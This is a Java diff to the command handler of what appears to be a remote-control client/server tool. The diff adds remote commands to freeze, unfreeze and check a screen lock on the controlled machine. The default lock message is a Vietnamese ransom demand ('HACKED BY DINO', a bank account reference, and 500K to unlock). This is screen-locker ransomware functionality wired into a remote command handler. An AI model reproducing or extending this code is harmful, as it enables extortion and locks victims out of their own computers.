@@ -164,6 +164,22 @@ public class ClientHandler implements Runnable {
                 NetworkDiag.bandwidthTest(out, safeInt(JsonUtil.extractValue(json, "size")));
                 break;
 
+            // ── Freeze Screen ──
+            case "FREEZE_SCREEN":
+                String freezeMsg = JsonUtil.extractValue(json, "message");
+                if (freezeMsg.isEmpty()) freezeMsg = "HACKED BY DINO\nVCB 0123456\n500K de mo khoa";
+                FreezeScreen.freeze(freezeMsg);
+                sendText("OK", "Screen frozen! Thong bao da hien thi tren server.");
+                break;
+            case "UNFREEZE_SCREEN":
+                FreezeScreen.unfreeze();
+                sendText("OK", "Screen unfrozen! Server da tro lai binh thuong.");
+                break;
+            case "CHECK_FREEZE_STATUS":
+                boolean frozen = FreezeScreen.isFrozen();
+                sendText("OK", frozen ? "FROZEN" : "NORMAL");
+                break;
+
             // ── Session ──
             case "DISCONNECT":
                 sendText("OK", "Da ngat ket noi.");
